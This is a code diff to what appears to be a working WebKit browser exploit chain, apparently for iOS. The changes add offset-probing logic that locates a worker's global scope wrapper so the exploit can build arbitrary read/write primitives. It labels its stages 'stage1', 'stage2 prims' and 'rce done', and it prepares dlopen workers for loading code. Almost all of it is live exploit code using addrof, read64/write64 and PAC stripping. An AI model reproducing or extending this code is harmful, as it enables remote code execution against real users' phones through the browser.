@@ -97,6 +97,95 @@ BigInt.prototype.asInt32s = function() {
     }
     return [lo, hi];
 };
+function offsetHex(offset) {
+    return '0x' + offset.toString(16);
+}
+function stripPointerForRead(value, label, log) {
+    const stripped = value.noPAC();
+    if (stripped !== value)
+        log(`${label}: stripped ${value.hex()} -> ${stripped.hex()}`);
+    return stripped;
+}
+function isLikelyReadablePointer(value) {
+    const ptr = value.noPAC();
+    return ptr >= 0x100000000n && ptr < 0x2000000000n && (ptr & 0x7n) === 0n;
+}
+function orderedBigIntOffsets(preferred, defaults) {
+    const seen = new Set();
+    const ordered = [];
+    function add(offset) {
+        if (typeof offset !== 'bigint')
+            return;
+        const key = offset.toString();
+        if (seen.has(key))
+            return;
+        seen.add(key);
+        ordered.push(offset);
+    }
+    add(preferred);
+    for (const offset of defaults)
+        add(offset);
+    return ordered;
+}
+function resolveWorkerGlobalWrapper(read64, worker, log, validateButterfly, preferredScriptOffset, preferredStrongOffset) {
+    const scriptOffsets = orderedBigIntOffsets(preferredScriptOffset, [
+        0x150n, 0x148n, 0x158n, 0x140n, 0x160n, 0x138n, 0x168n,
+        0x130n, 0x170n, 0x128n, 0x178n, 0x120n, 0x180n, 0x188n
+    ]);
+    const strongOffsets = orderedBigIntOffsets(preferredStrongOffset, [
+        0x20n, 0x18n, 0x28n, 0x30n, 0x10n, 0x38n, 0x40n, 0x48n,
+        0x50n, 0x58n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n
+    ]);
+    for (const scriptOffset of scriptOffsets) {
+        const scriptAddr = worker + scriptOffset;
+        log(`script candidate ${offsetHex(scriptOffset)} addr=${scriptAddr.hex()}`);
+        const scriptRaw = read64(scriptAddr);
+        const script = stripPointerForRead(scriptRaw, `script candidate ${offsetHex(scriptOffset)}`, log);
+        log(`script candidate ${offsetHex(scriptOffset)} raw=${scriptRaw.hex()} ptr=${script.hex()}`);
+        if (!isLikelyReadablePointer(script)) {
+            log(`script candidate ${offsetHex(scriptOffset)} rejected as invalid`);
+            continue;
+        }
+        for (const strongOffset of strongOffsets) {
+            const label = `script${offsetHex(scriptOffset)}+${offsetHex(strongOffset)}`;
+            const strongRaw = read64(script + strongOffset);
+            const strong = stripPointerForRead(strongRaw, `${label} strong`, log);
+            if (!isLikelyReadablePointer(strong)) {
+                log(`${label} strong rejected raw=${strongRaw.hex()} ptr=${strong.hex()}`);
+                continue;
+            }
+            log(`${label} strong=${strong.hex()}`);
+            const globalRaw = read64(strong);
+            const globalScopeWrapper = stripPointerForRead(globalRaw, `${label} globalScopeWrapper`, log);
+            if (!isLikelyReadablePointer(globalScopeWrapper)) {
+                log(`${label} globalScopeWrapper rejected raw=${globalRaw.hex()} ptr=${globalScopeWrapper.hex()}`);
+                continue;
+            }
+            const butterflyRaw = read64(globalScopeWrapper + 8n);
+            const butterfly = stripPointerForRead(butterflyRaw, `${label} butterfly`, log);
+            if (!isLikelyReadablePointer(butterfly)) {
+                log(`${label} butterfly rejected raw=${butterflyRaw.hex()} ptr=${butterfly.hex()}`);
+                continue;
+            }
+            const validation = validateButterfly(butterfly, label);
+            if (!validation) {
+                log(`${label} butterfly validation rejected`);
+                continue;
+            }
+            log(`selected script_offset=${offsetHex(scriptOffset)} strong_offset=${offsetHex(strongOffset)} global=${globalScopeWrapper.hex()} butterfly=${butterfly.hex()}`);
+            return {
+                ...validation,
+                scriptOffset,
+                strongOffset,
+                script,
+                strong,
+                globalScopeWrapper,
+                butterfly
+            };
+        }
+    }
+    return null;
+}
 [].shift();
 //!INCLUDE(rce/offsets/{ver}.js)
 
@@ -18060,46 +18149,42 @@ const device_chipset = {
               throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
 
           resolverCheckpoint(`worker selected=${worker.hex()}`);
-          function stripPointerForRead(value, label) {
-              const stripped = value.noPAC();
-              if (stripped !== value)
-                  resolverCheckpoint(`${label}: stripped ${value.hex()} -> ${stripped.hex()}`);
-              return stripped;
-          }
-          resolverCheckpoint(`reading worker script at ${(worker + 0x150n).hex()}`);
-          const scriptRaw = read64(worker + 0x150n);
-          resolverCheckpoint(`worker script raw=${scriptRaw.hex()}`);
-          const script = stripPointerForRead(scriptRaw, "worker script");
-          resolverCheckpoint(`worker script=${script.hex()}`);
           resolverCheckpoint(`reading workerOrWorkletThread at ${(worker + 0x160n).hex()}`);
           const workerOrWorkletThreadRaw = read64(worker + 0x160n);
-          const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread");
+          const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread", resolverCheckpoint);
           resolverCheckpoint(`workerOrWorkletThread=${workerOrWorkletThread.hex()}`);
-          resolverCheckpoint(`reading Strong_globalScopeWrapper at ${(script + 0x20n).hex()}`);
-          const Strong_globalScopeWrapperRaw = read64(script + 0x20n);
-          const Strong_globalScopeWrapper = stripPointerForRead(Strong_globalScopeWrapperRaw, "Strong_globalScopeWrapper");
-          resolverCheckpoint(`Strong_globalScopeWrapper=${Strong_globalScopeWrapper.hex()}`);
-          resolverCheckpoint(`reading globalScopeWrapper at ${Strong_globalScopeWrapper.hex()}`);
-          const globalScopeWrapperRaw = read64(Strong_globalScopeWrapper);
-          const globalScopeWrapper = stripPointerForRead(globalScopeWrapperRaw, "globalScopeWrapper");
-          resolverCheckpoint(`globalScopeWrapper=${globalScopeWrapper.hex()}`);
-          resolverCheckpoint(`reading worker_global_butterfly at ${(globalScopeWrapper + 8n).hex()}`);
-          const worker_global_butterfly_raw = read64(globalScopeWrapper + 8n);
-          const worker_global_butterfly = stripPointerForRead(worker_global_butterfly_raw, "worker_global_butterfly");
+          const expectedUnboxedArr = addrof(unboxed_arr);
+          const expectedBoxedArr = addrof(boxed_arr);
+          resolverCheckpoint(`expected worker globals unboxed_arr=${expectedUnboxedArr.hex()} boxed_arr=${expectedBoxedArr.hex()}`);
+          const workerGlobal = resolveWorkerGlobalWrapper(read64, worker, resolverCheckpoint, (candidateButterfly, label) => {
+              const candidateUnboxedRaw = read64(candidateButterfly);
+              const candidateUnboxed = stripPointerForRead(candidateUnboxedRaw, `${label} unboxed_arr`, resolverCheckpoint);
+              const candidateBoxedRaw = read64(candidateButterfly + 8n);
+              const candidateBoxed = stripPointerForRead(candidateBoxedRaw, `${label} boxed_arr`, resolverCheckpoint);
+              resolverCheckpoint(`${label} slots unboxed=${candidateUnboxed.hex()} boxed=${candidateBoxed.hex()}`);
+              if (candidateUnboxed !== expectedUnboxedArr || candidateBoxed !== expectedBoxedArr)
+                  return null;
+              return {
+                  unboxedArrPtr: candidateUnboxed,
+                  boxedArrPtr: candidateBoxed
+              };
+          });
+          if (!workerGlobal)
+              throw new TryAgainError("stage1 could not resolve worker global wrapper");
+          p_rce.worker_script_offset = workerGlobal.scriptOffset;
+          p_rce.worker_global_scope_wrapper_offset = workerGlobal.strongOffset;
+          resolverCheckpoint(`worker global offsets script=${offsetHex(workerGlobal.scriptOffset)} strong=${offsetHex(workerGlobal.strongOffset)}`);
+          const worker_global_butterfly = workerGlobal.butterfly;
           resolverCheckpoint(`butterfly:${worker_global_butterfly.hex()}`);
-          resolverCheckpoint(`reading unboxed_arr at ${worker_global_butterfly.hex()}`);
-          const unboxed_arr_raw = read64(worker_global_butterfly);
-          const unboxed_arr = stripPointerForRead(unboxed_arr_raw, "unboxed_arr");
-          resolverCheckpoint(`unboxed_arr=${unboxed_arr.hex()}`);
-          resolverCheckpoint(`reading boxed_arr at ${(worker_global_butterfly + 8n).hex()}`);
-          const boxed_arr_raw = read64(worker_global_butterfly + 8n);
-          const boxed_arr = stripPointerForRead(boxed_arr_raw, "boxed_arr");
-          resolverCheckpoint(`boxed_arr=${boxed_arr.hex()}`);
-          resolverCheckpoint(`reading butterfly at ${(boxed_arr + 8n).hex()}`);
-          const butterfly = read64(boxed_arr + 8n);
+          const unboxedArrPtr = workerGlobal.unboxedArrPtr;
+          const boxedArrPtr = workerGlobal.boxedArrPtr;
+          resolverCheckpoint(`unboxed_arr=${unboxedArrPtr.hex()}`);
+          resolverCheckpoint(`boxed_arr=${boxedArrPtr.hex()}`);
+          resolverCheckpoint(`reading butterfly at ${(boxedArrPtr + 8n).hex()}`);
+          const butterfly = read64(boxedArrPtr + 8n);
           resolverCheckpoint(`boxed butterfly=${butterfly.hex()}`);
-          resolverCheckpoint(`writing unboxed_arr butterfly slot at ${(unboxed_arr + 8n).hex()}`);
-          write64(unboxed_arr + 8n, butterfly);
+          resolverCheckpoint(`writing unboxed_arr butterfly slot at ${(unboxedArrPtr + 8n).hex()}`);
+          write64(unboxedArrPtr + 8n, butterfly);
           resolverCheckpoint("Finished stage1 prim succesfully");
         }
         function setup_stage2_prim()
@@ -18193,6 +18278,10 @@ const device_chipset = {
           globalThis.device_model = p.device_model;
           p.offsets = offsets;
           p.slide = slide;
+          p.worker_script_offset = p_rce.worker_script_offset;
+          p.worker_global_scope_wrapper_offset = p_rce.worker_global_scope_wrapper_offset;
+          if (typeof p.worker_script_offset === 'bigint' && typeof p.worker_global_scope_wrapper_offset === 'bigint')
+            print(`worker global offsets cached: script=${offsetHex(p.worker_script_offset)} strong=${offsetHex(p.worker_global_scope_wrapper_offset)}`);
           print("Finished stage2 prims succesfully, rce done");
           self.postMessage({
             type: 'prepare_dlopen_workers'
@@ -18397,6 +18486,10 @@ async function main() {
           print(`contexts_length: ${contexts_length.hex()}`);
           const dlopen_workers = [];
           p.dlopen_workers = dlopen_workers;
+          function workerResolverCheckpoint(message) {
+            print("worker resolver: " + message);
+            sleep(10);
+          }
           for (let i = 0n; i < contexts_length; ++i) {
             const ptr = contexts + i * 0x30n;
             const key = p.read64(ptr);
@@ -18404,14 +18497,34 @@ async function main() {
             const context = p.read64(ptr + 0x20n);
             const vtable = p.read64(context).noPAC();
             if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
-            const script = p.read64(context + 0x150n);
-            const workerOrWorkletThread = p.read64(context + 0x160n);
+            workerResolverCheckpoint(`context ${i} worker=${context.hex()}`);
+            const workerOrWorkletThreadRaw = p.read64(context + 0x160n);
+            const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread", workerResolverCheckpoint);
+            if (!isLikelyReadablePointer(workerOrWorkletThread)) {
+              workerResolverCheckpoint(`workerOrWorkletThread rejected raw=${workerOrWorkletThreadRaw.hex()} ptr=${workerOrWorkletThread.hex()}`);
+              continue;
+            }
             const thread = p.read64(workerOrWorkletThread + 0x28n);
-            const Strong_globalScopeWrapper = p.read64(script + 0x20n);
-            const globalScopeWrapper = p.read64(Strong_globalScopeWrapper);
-            const butterfly = p.read64(globalScopeWrapper + 8n);
-            const id = p.read64(butterfly);
-            const bitmap = p.read64(butterfly + 8n);
+            const workerGlobal = resolveWorkerGlobalWrapper(p.read64, context, workerResolverCheckpoint, (candidateButterfly, label) => {
+              const id = p.read64(candidateButterfly);
+              const bitmapRaw = p.read64(candidateButterfly + 8n);
+              const bitmap = stripPointerForRead(bitmapRaw, `${label} bitmap`, workerResolverCheckpoint);
+              workerResolverCheckpoint(`${label} slots id=${id.hex()} bitmap=${bitmap.hex()}`);
+              if (id == 0xfffe000011111111n || id == 0xfffe000022222222n) {
+                if (!isLikelyReadablePointer(bitmap))
+                  return null;
+                return { id, bitmap };
+              }
+              if (id == 0xfffe000033333333n)
+                return { id, bitmap };
+              return null;
+            }, p.worker_script_offset, p.worker_global_scope_wrapper_offset);
+            if (!workerGlobal) {
+              workerResolverCheckpoint(`worker=${context.hex()} global wrapper not resolved`);
+              continue;
+            }
+            const id = workerGlobal.id;
+            const bitmap = workerGlobal.bitmap;
             if (id == 0xfffe000011111111n || id == 0xfffe000022222222n) {
               p.dlopen_workers.push({
                 thread: thread,
@@ -18425,6 +18538,9 @@ async function main() {
               };
             }
           }
+          print(`dlopen workers found: ${dlopen_workers.length}`);
+          if (dlopen_workers.length < 2)
+            throw new Error("missing dlopen workers");
           const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
           print(`defaultLoader: ${defaultLoader.hex()}`);
           if (defaultLoader) {
